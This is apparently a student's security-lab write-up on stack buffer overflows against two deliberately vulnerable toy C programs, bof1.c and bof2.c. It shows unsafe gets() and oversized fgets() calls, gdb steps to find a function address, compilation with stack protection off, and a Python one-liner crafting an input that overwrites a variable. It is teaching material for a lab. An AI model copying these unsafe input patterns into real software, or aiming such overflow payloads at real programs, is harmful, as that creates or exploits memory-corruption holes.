# 22110026, Lê Huy Hoàng
**Lab#1: Conduct buffer overflow attack on _bof1.c_, _bof2.c_, _bof3.c_ programs.**
## bo1.c
Conduct a buffer overflow attack on _bof1.c_ 
```ruby
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        prinf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
1. **Vulnerabilities:** the`get() function` is unsafe because it does not perform any bounds checking on the input. If the user provides input larger than the buffer (which is `char array[200]` in this case), it will overwrite adjacent memory locations, potentially including the return address of the `vuln() function`.
2. **Goal:** You want to overflow the array buffer in such a way that the return address is overwritten with the address of `secretFunc()`
 - Step 1: Indentify the buffer size and offsets
  - The buffer `array` is 200 bytes, but you need to determine where the return address is stored relative to the start of the buffer.
  - This can be done by trial and error, injecting a large enough input to identify when the overflow occurs.
 - Step 2: Find the Address of `secretFunc()`
  - You can use a debugger (e.g.,`gdb`) to find the address of `secretFunc()`. The address of this function will be injected into the return address location. Use `gdb` to compile and load the program:
    ```ruby
    gcc -g bof1.c -o bof1
    gdb ./bof1
    ```
  - Inside `gdb`, find the address of `secretFunc()`:
    ```ruby
    (gdb) disassemble secretFunc
    ```
  - This will give you the memory address where `secretFunc()` is stored.
    ```ruby
    (gdb) disassemble secretFunc
    Dump of assembler code for function secretFunc:
    0x00000000000011b5 <+0>:     push   %rbp
    0x00000000000011b6 <+1>:     mov    %rsp,%rbp
    0x00000000000011b9 <+4>:     lea    0xe40(%rip),%rax        # 0x2000
    0x00000000000011c0 <+11>:    mov    %rax,%rdi
    0x00000000000011c3 <+14>:    mov    $0x0,%eax
    0x00000000000011c8 <+19>:    call   0x1020 <printf@plt>
    0x00000000000011cd <+24>:    nop
    0x00000000000011ce <+25>:    pop    %rbp
    0x00000000000011cf <+26>:    ret
    End of assembler dump.
    (gdb) 
    ```
 - The address is  `0x00000000000011b5`.
 - Step 3: Craft the malicious input
   - 200 characters to fill up the buffer
   - Additional padding to reach the return address
   - the return address of `secretFunc()`

## bof2.c
Conduct a buffer overflow attack on _bof2.c_ 
```ruby
#include <stdlib.h>
#include <stdio.h>
void main(int argc, char *argv[])
{
  int var;
  int check = 0x04030201;
  char buf[40];
  fgets(buf,45,stdin);
  printf("\n[buf]: %s\n", buf);
  printf("[check] 0x%x\n", check);
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  if (check == 0xdeadbeef)
   {
     printf("Yeah! You win!\n");
   }
}
```
###Step 1: Compile the program
First, ensure the program is compiled without stack protection and with debugging information. You can use the following command:
```gcc -o buffer_overflow buffer_overflow.c -fno-stack-protector -z execstack -g```
###Step 2: Run the program
```./bof2```
###Step 3: Check the buffer size
You can do this by input some random things, for example: 
```ruby
/mnt/d/uni/2025/info/seclabs/bof $ ./bof2
test input
[buf]: test input
[check] 0x4030201
```
###Step 4: Create a exploit input
You need to construct an input that:
    - Fills buf with 40 characters.
    - Overwrites check with the value 0xdeadbeef in little-endian format.
###Step 5: Generate the input
```python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' > exploit_input```
This command creates a file named exploit_input containing:
    - 40 'A's (filling buf)
    - The bytes ef be ad de (overwriting check)
###Step 6: run the program with exploit input
```./bof2 < exploit_input```
###Step 7: Check the output
If successful, you get this: 
```ruby
[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0xdeadbeef
Yeah! You win!
```

